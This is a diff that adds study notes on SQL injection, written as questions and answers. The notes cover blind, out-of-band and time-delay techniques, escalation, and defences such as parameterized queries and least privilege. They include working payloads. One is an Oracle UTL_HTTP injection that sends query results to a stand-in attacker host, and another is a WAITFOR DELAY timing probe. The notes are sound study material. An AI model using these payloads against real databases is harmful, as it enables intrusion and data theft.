@@ -138,4 +138,83 @@
 
         ASCII(SUBSTR(‘Admin’,1,1))
 
- - p 317 (using an out-of-band channel)-
+- Sometimes, there is an SQL injection issue, but nothing is sent back to the client (except maybe an error message). How do you extract the data then?
+    If an error message is returned, try blind SQL injection.
+        - How?
+            By extracting the table/attributes name with ASCII and SUBSTRING one bit at a time (true/false behavior)
+    You can also use out-of-band channel (given the DB allows it)
+        Take the following statement
+
+        SELECT * FROM users WHERE username = ‘marcus’ and password = ‘secret’
+
+        Injecting this (join the result to the item the attacker controls):
+
+        foo’ ||  (SELECT 1 FROM dual WHERE (SELECT username FROM all_users WHERE username = ‘DBSNMP’) = ‘DBSNMP’)--
+
+        results in the follwing query
+
+        SELECT * FROM users WHERE username = ‘foo’ || (SELECT 1 FROM dual WHERE (SELECT username FROM all_users WHERE username = ‘DBSNMP’) = ‘DBSNMP’)
+
+        appending the results to foo. Now you need to be able to retrieve the results of the query.
+
+        For example, with Oracle, you can create an out-of-band connection with UTL_HTTP. (Even low-privileged users can create those)
+        /employees.asp?EmpNo=7521’||UTL_HTTP.request(‘mdattacker.net:80/’|| (SELECT%20username%20FROM%20all_users%20WHERE%20ROWNUM%3d1))--
+
+    You can also use the behavior of the DB itself to induce a conditionnal response, usefull when no errors are returned to the client. For example
+        SELECT X FROM Y WHERE C
+        if C is never true, than X will never be evaluated. Put 1/0 in X, if C is true, then the query will fail and vice versa
+
+- What technique could an attacker use is none of the above methods works? How does it work?
+    Time delays
+    If the expression is evaluated in one way, it will cause a delay, the other way it won't
+        Ex: if ASCII(SUBSTRING(‘Admin’,1,1)) = 64 waitfor delay ‘0:0:5’
+
+- What kind of attacks can be escalated from SQL injection?
+    If DB is shared with other applications, may be able to escalate privileges within the DB
+    May be able to compromise the OS of the DB server
+    In a DB you are sometime considered in a safe zone, so you could be able to reach key services on other hosts
+    Make network connections back out of the osting infrastructure to the attacker's computer
+    Reimplement functionnality that has been removed or disabled.
+
+- Should we defend DBs against authenticated users? Even admin?
+    Yes, because it is not impossible for an attacker to authenticate as a user
+
+- What are some partially effective measures? Why are they not totally effective?
+    Escape any '
+        Numeric user-suplied data is being embedded into SQL queries are usually not encapsulated into '', the attacker can break out of the data context by simply entering arbitrary SQL
+        Second-order SQL injection attacks (doubled quotation marks return to their original form when the data is used)
+    Stored procedures for all DB access
+        Poorly written stored proceedure can contain injection vulnerabilities
+        Robust stored procedure can be invoked in an unsafe way using user-supplied input.
+
+- So, how do you handle securly user input?
+    With parameterized queries.
+        The application specifies the query's structure, leaving placeholders for each item of user input
+        The application specifies the contents of each placeholder
+
+        The input is therefore always interpreted as data.
+
+        unsafe:
+            //define the query structure 
+            String queryText = “select ename,sal from emp where ename =’”;
+            //concatenate the user-supplied name 
+            queryText += request.getParameter(“name”); queryText += “’”;
+            // execute the query 
+            stmt = con.createStatement(); rs = stmt.executeQuery(queryText);
+
+        safe:
+            //define the query structure 
+            tring queryText = “SELECT ename,sal FROM EMP WHERE ename = ?”;
+            //prepare the statement through DB connection “con” 
+            stmt = con.prepareStatement(queryText);
+            //add the user input to variable 1 (at the first ? placeholder) 
+            stmt.setString(1, request.getParameter(“name”));
+            // execute the query 
+            rs = stmt.executeQuery();
+
+    If the name of a table/column is supplied by the user, use a white list of good values
+
+- What other security measures could be used? (defense in dept)
+    The application should use the lowest possible level of priviliges when accessing the DB
+    Unnecessary functions should be removed or disabled.
+    All vendor-issued security patches sould be evaluated, tested and applied in a timely way.
